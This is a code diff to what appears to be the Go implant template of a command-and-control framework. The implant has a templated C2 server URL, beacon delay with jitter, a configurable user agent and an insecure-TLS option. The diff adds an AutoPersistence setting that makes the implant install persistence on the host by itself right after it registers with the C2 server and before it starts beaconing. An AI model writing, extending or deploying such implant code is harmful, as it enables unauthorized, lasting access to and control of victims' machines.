@@ -16,19 +16,21 @@ import (
 )
 
 type Config struct {
-	ServerURL   string
-	BeaconDelay time.Duration
-	Jitter      time.Duration
-	UserAgent   string
-	InsecureTLS bool
+	ServerURL       string
+	BeaconDelay     time.Duration
+	Jitter          time.Duration
+	UserAgent       string
+	InsecureTLS     bool
+	AutoPersistence bool
 }
 
 var config = Config{
-	ServerURL:   "{{ .C2URL }}",
-	BeaconDelay: {{ .BeaconDelay }} * time.Second,
-	Jitter:      {{ .Jitter }} * time.Second,
-	UserAgent:   "{{ .UserAgent }}",
-	InsecureTLS: {{ .InsecureTLS }},
+	ServerURL:       "{{ .C2URL }}",
+	BeaconDelay:     {{ .BeaconDelay }} * time.Second,
+	Jitter:          {{ .Jitter }} * time.Second,
+	UserAgent:       "{{ .UserAgent }}",
+	InsecureTLS:     {{ .InsecureTLS }},
+	AutoPersistence: {{ .AutoPersistence }},
 }
 
 var agentID string
@@ -355,6 +357,17 @@ func main() {
 		logf("Registration failed, exiting after 10 seconds")
 		time.Sleep(10 * time.Second)
 		return
+	}
+
+	// Auto‑persistence if enabled
+	if config.AutoPersistence {
+		logf("Auto-persistence enabled, installing...")
+		method, err := setupPersistence()
+		if err != nil {
+			logf("Auto-persistence failed: %v", err)
+		} else {
+			logf("Auto-persistence installed using %s", method)
+		}
 	}
 
 	for {
